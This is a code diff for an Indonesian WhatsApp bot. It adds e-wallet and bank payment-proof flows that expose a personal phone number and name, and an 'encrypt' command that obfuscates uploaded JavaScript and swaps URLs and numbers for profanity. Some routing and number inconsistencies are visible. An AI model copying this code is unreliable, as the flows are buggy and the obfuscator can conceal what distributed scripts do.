+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Next",
+                sections: [
+                    {
+                        title: "Lanjutkan Transaksi",
+                        rows: [
+                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+
+try {
+    // Path ke file gambar lokal
+    const imagePath = './src/media/cimbb.png'; // Ganti dengan path yang sesuai
+
+    // Membaca gambar dari file lokal
+    const imageBuffer = fs.readFileSync(imagePath);
+
+    // Menyiapkan media (gambar)
+    const mediaMessage = await prepareWAMessageMedia(
+        { image: imageBuffer }, // Menggunakan buffer gambar lokal
+        { upload: sych.waUploadToServer }
+    );
+
+    // Membuat pesan dengan gambar
+    const msg = generateWAMessageFromContent(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: confirmationText
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
+                            title: 'Pengunggahan Bukti Transfer CIMB',
+                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
+                            hasMediaAttachment: true, // Menandakan bahwa ada media
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: button
+                        })
+                    })
+                }
+            }
+        },
+        { quoted: fkontak }
+    );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses upload_cimb_proof:", error); // Debugging
+    }
+}
+break;
+
+case 'submit_cimb_proof': {
+    console.log("Case 'submit_cimb_proof' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pengunggahan bukti
+    const proofSubmissionText = `
+
+⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Kirim Bukti",
+                sections: [
+                    {
+                        title: "Proses Unggah",
+                        rows: [
+                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
+                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: proofSubmissionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Silakan unggah bukti Anda."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Unggah Bukti Transfer',
+                                subtitle: 'Pengunggahan bukti transfer Anda.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses submit_cimb_proof:", error); // Debugging
+    }
+}
+break;
+
+
+//akhir cimb
+
+
+case 'confirm_payment': {
+    const confirmText = `
+        ✅ *Konfirmasi Pembayaran Berhasil*\n\n
+        Terima kasih telah melakukan pembayaran. Silakan kirimkan bukti pembayaran berupa gambar atau foto tagihan melalui chat ini untuk diproses lebih lanjut.\n\n
+        Kami akan segera memverifikasi pembayaran Anda. Mohon tunggu notifikasi selanjutnya.`;
+
+    try {
+        await sycreply(confirmText);
+        console.log("Pesan konfirmasi pembayaran berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Gagal mengirim pesan konfirmasi pembayaran:", error); // Debugging jika terjadi error
+    }
+    break;
+}
+
+
+
+case 'ewallet': {
+    console.log("Case 'ewallet' dijalankan."); // Debugging
+
+    // Data bank
+    const banks = [
+        { title: "Gopay", id: "gopay", description: "Nomor E-wallet: 082280993065 - Status: 🟢" },
+        { title: "Dana", id: "dana", description: "Nomor Dana: 082280993065 - Status: 🟢" }
+    ];
+
+    // Pesan instruksi
+    let instructionText = "💳 *Informasi E-Wallet*\n\nPilih E-Wallet untuk melakukan transfer.";
+
+    // Tombol interaktif
+    let buttons = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Pilih E-Wallet untuk Transfer",
+                sections: [
+                    {
+                        title: "E-Wallet Transfer",
+                        rows: banks.map(bank => ({
+                            title: bank.title,
+                            id: bank.id, // Menggunakan ID bank langsung
+                            description: bank.description
+                        }))
+                    }
+                ]
+            })
+        }
+    ];
+
+    // Membuat pesan interaktif untuk memilih bank
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: instructionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pilih E-Wallet untuk Pembayaran',
+                                subtitle: 'Pilih E-Wallet Anda',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: buttons
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+
+
+
+//awal gopay
+
+
+
+case 'gopay': {
+    console.log("Case 'gopay' dijalankan."); // Debugging
+
+    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
+    const confirmationText = `
+            *${n}E-Wallet Gopay${n}*
+            *${n}ATAS NAMA : GALANG${n}* 
+            *${n}Nomor E-Wallet : 082280993065${n}*
+            *${n}STATUS :${n}* 🟢
+        
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+        buttonParamsJson: JSON.stringify({
+            title: "Proses Transaksi",
+            sections: [
+                {
+                    title: "Confirm Transaksi",
+                    rows: [
+                        { title: "Confirm", id: "confirm_gopay_payment", description: "Konfirmasi Pembayaran Gopay" },
+                        { title: "Upload", id: "upload_gopay_proof", description: "Kirim Bukti Transfer Gopay" }
+                    ]
+                }
+            ]
+        })
+    },
+    {
+        name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "Salin",
+            copy_code: "082280993065"
+        })
+    }
+];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Konfirmasi Pembayaran E-wallet Gopay',
+                                subtitle: 'Terima kasih atas pembayaran Anda!',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+
+case 'confirm_gopay_payment': {
+const name = getUserName(m.sender);
+    console.log("Case 'confirm_gopay_payment' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pembayaran
+    const confirmationText = `
+⚠️ *Pending Transaksi:*
+
+📌 *E-Wallet GOPAY* 
+- ATAS NAMA: GALANG
+- Nomor Gopay: 08228099306
+
+⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*`;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Tutup Transaksi",
+                sections: [
+                    {
+                        title: "Close",
+                        rows: [
+                            { title: "Tutup", id: "close_payment", description: "Selesai" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Klik tombol di bawah untuk aksi lanjutan."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Status Pending 🔴',
+                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+
+        // Mengirim pesan otomatis ke owner
+        const sender = m.sender;
+        await sych.sendMessage('50251731838@s.whatsapp.net', {
+            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
+            mentions: [sender]
+        }, { quoted: fkontak });
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses confirm_gopay_payment:", error); // Debugging
+    }
+}
+break;
+
+
+//UPLOAD
+case 'upload_gopay_proof': {
+    console.log("Case 'upload_gopay_proof' dijalankan."); // Debugging
+
+    // Pesan instruksi pengunggahan
+    const confirmationText = `
+📝 *Instruksi Pengunggahan Bukti Transfer:*
+1. Pastikan bukti transfer terlihat jelas.
+2. Screnshoot yang diterima: JPG, PNG, atau PDF.
+3. Kirim bukti transfer Anda dengan Screnshoot.
+
+📌 *E-Wallet GOPAY:* 
+- ATAS NAMA: GALANG
+- Nomor Gopay: 082280993065
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Next",
+                sections: [
+                    {
+                        title: "Lanjutkan Transaksi",
+                        rows: [
+                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+
+try {
+    // Path ke file gambar lokal
+    const imagePath = './src/media/gopayy.png'; // Ganti dengan path yang sesuai
+
+    // Membaca gambar dari file lokal
+    const imageBuffer = fs.readFileSync(imagePath);
+
+    // Menyiapkan media (gambar)
+    const mediaMessage = await prepareWAMessageMedia(
+        { image: imageBuffer }, // Menggunakan buffer gambar lokal
+        { upload: sych.waUploadToServer }
+    );
+
+    // Membuat pesan dengan gambar
+    const msg = generateWAMessageFromContent(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: confirmationText
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
+                            title: 'Pengunggahan Bukti Transfer Gopay',
+                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
+                            hasMediaAttachment: true, // Menandakan bahwa ada media
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: button
+                        })
+                    })
+                }
+            }
+        },
+        { quoted: fkontak }
+    );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses upload_gopay_proof:", error); // Debugging
+    }
+}
+break;
+
+case 'submit_gopay_proof': {
+    console.log("Case 'submit_gopay_proof' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pengunggahan bukti
+    const proofSubmissionText = `
+
+⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Kirim Bukti",
+                sections: [
+                    {
+                        title: "Proses Unggah",
+                        rows: [
+                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
+                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: proofSubmissionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Silakan unggah bukti Anda."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Unggah Bukti Transfer',
+                                subtitle: 'Pengunggahan bukti transfer Anda.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses submit_gopay_proof:", error); // Debugging
+    }
+}
+break;
+
+
+//akhir gopay
+
+//awal dana
+case 'dana': {
+    console.log("Case 'dana' dijalankan."); // Debugging
+
+    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
+    const confirmationText = `
+            *${n}E-Wallet DANA${n}*
+            *${n}ATAS NAMA : GALANG${n}* 
+            *${n}Nomor E-Wallet : 082280993065${n}*
+            *${n}STATUS :${n}* 🟢
+        
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+        buttonParamsJson: JSON.stringify({
+            title: "Proses Transaksi",
+            sections: [
+                {
+                    title: "Confirm Transaksi",
+                    rows: [
+                        { title: "Confirm", id: "confirm_dana_payment", description: "Konfirmasi Pembayaran DANA" },
+                        { title: "Upload", id: "upload_dana_proof", description: "Kirim Bukti Transfer dana" }
+                    ]
+                }
+            ]
+        })
+    },
+    {
+        name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "Salin",
+            copy_code: "082280993065"
+        })
+    }
+];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Konfirmasi Pembayaran E-wallet DANA',
+                                subtitle: 'Terima kasih atas pembayaran Anda!',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+
+case 'confirm_dana_payment': {
+const name = getUserName(m.sender);
+    console.log("Case 'confirm_dana_payment' dijalankan."); // Debugging
+const userName = m.pushName || "Pengguna"; 
+    // Pesan konfirmasi pembayaran
+    const confirmationText = `
+⚠️ *Pending Transaksi:*
+
+📌 *E-Wallet DANA* 
+- ATAS NAMA: GALANG
+- Nomor dana: 08228099306
+
+⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*)`;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Tutup Transaksi",
+                sections: [
+                    {
+                        title: "Close",
+                        rows: [
+                            { title: "Tutup", id: "close_payment", description: "Selesai" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Klik tombol di bawah untuk aksi lanjutan."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Status Pending 🔴',
+                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+
+        // Mengirim pesan otomatis ke owner
+        const sender = m.sender;
+        await sych.sendMessage('50251731838@s.whatsapp.net', {
+            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
+            mentions: [sender]
+        }, { quoted: fkontak });
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses confirm_dana_payment:", error); // Debugging
+    }
+}
+break;
+
+
+//UPLOAD
+case 'upload_dana_proof': {
+    console.log("Case 'upload_dana_proof' dijalankan."); // Debugging
+
+    // Pesan instruksi pengunggahan
+    const confirmationText = `
+📝 *Instruksi Pengunggahan Bukti Transfer:*
+1. Pastikan bukti transfer terlihat jelas.
+2. Screnshoot yang diterima: JPG, PNG, atau PDF.
+3. Kirim bukti transfer Anda dengan Screnshoot.
+
+📌 *E-Wallet DANA:* 
+- ATAS NAMA: GALANG
+- Nomor dana: 082280993065
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Next",
+                sections: [
+                    {
+                        title: "Lanjutkan Transaksi",
+                        rows: [
+                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+
+try {
+    // Path ke file gambar lokal
+    const imagePath = './src/media/danaa.png'; // Ganti dengan path yang sesuai
+
+    // Membaca gambar dari file lokal
+    const imageBuffer = fs.readFileSync(imagePath);
+
+    // Menyiapkan media (gambar)
+    const mediaMessage = await prepareWAMessageMedia(
+        { image: imageBuffer }, // Menggunakan buffer gambar lokal
+        { upload: sych.waUploadToServer }
+    );
+
+    // Membuat pesan dengan gambar
+    const msg = generateWAMessageFromContent(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: confirmationText
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
+                            title: 'Pengunggahan Bukti Transfer Dana',
+                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
+                            hasMediaAttachment: true, // Menandakan bahwa ada media
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: button
+                        })
+                    })
+                }
+            }
+        },
+        { quoted: fkontak }
+    );
+
+   
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses upload_dana_proof:", error); // Debugging
+    }
+}
+break;
+
+case 'submit_dana_proof': {
+    console.log("Case 'submit_dana_proof' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pengunggahan bukti
+    const proofSubmissionText = `
+
+⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Kirim Bukti",
+                sections: [
+                    {
+                        title: "Proses Unggah",
+                        rows: [
+                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
+                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: proofSubmissionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Silakan unggah bukti Anda."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Unggah Bukti Transfer',
+                                subtitle: 'Pengunggahan bukti transfer Anda.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses submit_dana_proof:", error); // Debugging
+    }
+}
+break;
+
+
+case 'encrypt': {
+    console.log("[INFO] Case 'encrypt' dimulai...");
+
+   
+    // Periksa apakah ada pesan yang di-reply
+    if (!m.quoted) {
+        console.log("[ERROR] Tidak ada pesan yang di-reply.");
+        return await sych.sendMessage(m.chat, { text: "Reply file .js untuk diencrypt." }, { quoted: m });
+    }
+
+    // Coba akses informasi file melalui m.quoted.documentMessage
+    const mime = m.quoted.mimetype || m.quoted.msg?.documentMessage?.mimetype || '';
+    const originalFilename = m.quoted.fileName || m.quoted.msg?.documentMessage?.fileName || 'unknown.js';
+
+    console.log("[DEBUG] MIME type file:", mime);
+    console.log("[DEBUG] Nama file:", originalFilename);
+
+    // Periksa apakah file berformat .js
+    if (!mime.includes("javascript") && !originalFilename.endsWith(".js")) {
+        console.log("[ERROR] File yang di-reply bukan file .js");
+        return await sych.sendMessage(m.chat, { text: "File harus bertipe .js" }, { quoted: m });
+    }
+
+    try {
+        console.log("[INFO] Mengunduh file...");
+        const media = await m.quoted.download();
+
+        if (!media) {
+            console.log("[ERROR] Gagal mengunduh file.");
+            return await sych.sendMessage(m.chat, { text: "Gagal mengunduh file. Coba lagi." }, { quoted: m });
+        }
+
+        // Tentukan nama file
+        const inputPath = `./temp/${originalFilename}`;
+        const outputPath = `./temp/encrypted_${originalFilename}`;
+        console.log("[DEBUG] File disimpan sementara di:", inputPath);
+
+        if (!fs.existsSync('./temp')) fs.mkdirSync('./temp');
+        await fs.writeFileSync(inputPath, media);
+
+        await sych.sendMessage(m.chat, { text: "Memproses encrypt file .js..." }, { quoted: m });
+
+        console.log("[INFO] Memulai proses obfuscation...");
+        const sourceCode = await fs.readFileSync(inputPath, 'utf8');
+
+        // Lakukan obfuscation
+        const obfuscatedCode = JavaScriptObfuscator.obfuscate(sourceCode, {
+            compact: true,
+            controlFlowFlattening: true,
+            controlFlowFlatteningThreshold: 1,
+            deadCodeInjection: true,
+            deadCodeInjectionThreshold: 0.4,
+            disableConsoleOutput: true,
+            renameGlobals: true,
+            stringArray: true,
+            simplify: true,
+            identifierNamesGenerator: 'mangled',
+            rotateStringArray: true,
+            numbersToExpressions: true,
+            stringArrayThreshold: 0.75,
+        }).getObfuscatedCode();
+
+        // Array khusus untuk mengganti string setelah obfuscation
+        const replacements = [
+            { original: 'Sychz', replacement: 'memek' },
+            { original: 'https://my.hitori.pw/api', replacement: 'kontol' },
+            { original: '6288274119688', replacement: 'sinting' },
+            { original: '50251731838', replacement: 'sinting' },
+              { original: '17089003182', replacement: 'sinting' },          { original: 'https://my.hitori.pw/apihtrkey-awokawok', replacement: 'sinting' }         
+        ];
+
+        // Fungsi untuk mengganti string dalam kode setelah obfuscation
+        function replaceWithArray(obfuscatedCode) {
+            replacements.forEach(replacement => {
+                const regex = new RegExp(replacement.original, 'g');
+                obfuscatedCode = obfuscatedCode.replace(regex, replacement.replacement);
+            });
+            return obfuscatedCode;
+        }
+
+        // Ganti string dalam kode yang sudah diobfuscate
+        const finalCode = replaceWithArray(obfuscatedCode);
+
+        console.log("[INFO] Menyimpan hasil encrypt...");
+        await fs.writeFileSync(outputPath, finalCode);
+
+        console.log("[INFO] Mengirim file hasil encrypt...");
+        await sych.sendMessage(
+            m.chat,
+            {
+                document: fs.readFileSync(outputPath),
+                mimetype: "application/javascript",
+                fileName: `encrypted_${originalFilename}`,
+                caption: "Berhasil mengenkripsi file .js!"
+            },
+            { quoted: m }
+        );
+
+        console.log("[INFO] Menghapus file sementara...");
+        fs.unlinkSync(inputPath);
+        fs.unlinkSync(outputPath);
+
+        console.log("[INFO] Case 'encrypt' selesai.");
+    } catch (error) {
+        console.error("[ERROR] Terjadi kesalahan:", error);
+        await sych.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengenkripsi: " + error.message }, { quoted: m });
+    }
 }
 break;
 
@@ -1437,7 +8872,7 @@ break;
 
 case 'setppbot': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!/image/.test(mime)) return sycreply(`Reply Image Dengan Caption ${prefix + command}`);
     let media = await sych.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
     if (text.length > 0) {
@@ -1466,7 +8901,7 @@ case 'setppbot': {
 break;
 			case 'delppbot': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     await sych.removeProfilePicture(sych.user.id);
     sycreply('Sukses');
 }
@@ -1474,7 +8909,7 @@ break;
 
 case 'join': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!text) return sycreply('Masukkan Link Group!');
     if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return sycreply('Link Invalid!');
     const result = args[0].split('https://chat.whatsapp.com/')[1];
@@ -1501,7 +8936,7 @@ break;
 
 case 'leave': {
     if (!isCreator) return sycreply(mess.owner);
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
